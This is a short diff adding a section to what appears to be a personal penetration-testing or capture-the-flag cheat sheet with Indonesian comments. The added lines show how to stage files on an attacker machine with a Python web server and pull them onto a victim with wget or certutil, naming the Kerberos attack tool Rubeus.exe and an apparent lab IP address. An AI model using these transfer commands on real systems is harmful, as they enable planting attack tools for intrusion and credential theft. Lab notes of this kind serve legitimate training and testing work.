@@ -65,5 +65,15 @@ PS C:\Share> $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.Get
 ```
 
 
+# Kirim file
+```shell
+# Attacker machine
+python3 -m http.server 8088
 
+# Victimm machine
+wget http://10.10.14.38:8088/<file>
+
+# kalau filenya besar
+certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe
+```
 
